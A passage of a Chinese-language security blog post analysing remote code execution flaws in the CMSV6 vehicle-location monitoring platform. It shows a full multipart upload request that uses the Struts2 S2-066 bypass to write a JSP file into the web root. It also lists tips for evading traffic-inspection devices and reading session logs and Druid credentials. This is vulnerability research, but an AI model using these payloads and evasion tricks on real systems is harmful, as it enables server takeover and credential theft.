class="keyword">this</span>.addCustomResponse(ACTION_RESULT, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDescribe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.describe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDescribe</span><span class="params">(String describe)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.describe = describe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;File&gt; <span class="title">getUploadFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.uploadFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUploadFile</span><span class="params">(List&lt;File&gt; uploadFile)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uploadFile = uploadFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getUploadFileFileName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.uploadFileFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUploadFileFileName</span><span class="params">(List&lt;String&gt; uploadFileFileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uploadFileFileName = uploadFileFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getUploadFileContentType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.uploadFileContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUploadFileContentType</span><span class="params">(List&lt;String&gt; uploadFileContentType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uploadFileContentType = uploadFileContentType;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在代码中看到直接的路径拼接，<code>FileOutputStream fos = new FileOutputStream(&quot;C:\\&quot; + fileName);</code>，因此我们便可以直接上传<code>jasper</code>文件并触发反序列化了</p><p>另一方面既然可以任意写入，我们很容易想到在子目录下写入webshell文件，但由于是struts2的上传处理，在<code>org.apache.struts2.interceptor.FileUploadInterceptor</code>中，在这个拦截器最终获取文件名时，会处理带<code>\</code>以及<code>/</code>的文件名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">getCanonicalName</span><span class="params">(<span class="keyword">final</span> String originalFileName)</span> </span>&#123;</span><br><span class="line">      String fileName = originalFileName;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> forwardSlash = fileName.lastIndexOf(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      <span class="keyword">int</span> backwardSlash = fileName.lastIndexOf(<span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (forwardSlash != -<span class="number">1</span> &amp;&amp; forwardSlash &gt; backwardSlash) &#123;</span><br><span class="line">          fileName = fileName.substring(forwardSlash + <span class="number">1</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          fileName = fileName.substring(backwardSlash + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> fileName;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时候怎么办呢？我们知道struts2在23年年底出了一个新漏洞，这时候便可以排出用场了，忘了的可以回顾我之前的文章，<a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">Apache Struts2 文件上传分析(S2-066)</a></p><p>因此我们便能够构造，达到前台RCE的效果</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfv</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;UploadFile&quot;;filename=&quot;z12.jsp&quot;;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/vnd.openxmlformats-officedocument.wordprocessingml.document</span><br><span class="line"></span><br><span class="line">&lt;%out.print(&quot;Hacked By Y4tacker&quot;);%&gt;</span><br><span class="line">--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfv</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;uploadFileFileName&quot;;</span><br><span class="line"></span><br><span class="line">Program Files\CMSServerV6\tomcat\webapps\gpsweb\1.jsp</span><br><span class="line">--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfv--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但很可惜新版本中struts2的依赖更新到了2.5.33的安全版本，并且将<code>com.framework.web.action.FileUploadAction#upload</code>强行设置了路径<code>404</code>并移除了上传处理逻辑，因此在新版本中也便失效了</p><p>结合S2的漏洞时间可以大胆猜测也许是在年底前删除的？当然由于我没有代码所以无处验证了，在实战环境中可以多做尝试</p><h3 id="对抗流量设备的一些尝试"><a href="#对抗流量设备的一些尝试" class="headerlink" title="对抗流量设备的一些尝试"></a>对抗流量设备的一些尝试</h3><ul><li><p>不仅仅可以读取log_info.log获取用户session，还可以尝试读取web.xml文件，在当中配置了Druid监控的用户名以及密码，在老版本中这个配置默认启用，新版本中druid监控成为了可选项，但不失为一种漏洞利用的尝试</p></li><li><p>使用全类名替代<code>bean</code>的获取形式，假如流量设备拦截路由为<code>/StandardABCAction_downLoad</code>，我们完全可以使用<code>/com.xxx.xxxxAction_downLoad</code>的形式尝试绕过</p></li><li><p>我们不仅可以使用官方公告中使用的<code>StandardSchoolBusAction</code>路由，经过分析凡是继承了<code>com.gpsCommon.action.CommonBaseAction</code>的类均能使用</p></li></ul></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">浅析通天星CMSV6车载定位监控平台远程代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">1.2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.2.1.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.2.</span> <span class="toc-text">后台文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.3.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6"><span class="toc-number">1.2.4.</span> <span class="toc-text">尝试突破文件上传限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97%E6%B5%81%E9%87%8F%E8%AE%BE%E5%A4%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.5.</span> <span class="toc-text">对抗流量设备的一些尝试</span></a></li></ol></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&text=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&is_video=false&description=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞&body=Check out this article: https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&name=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&t=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2025 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>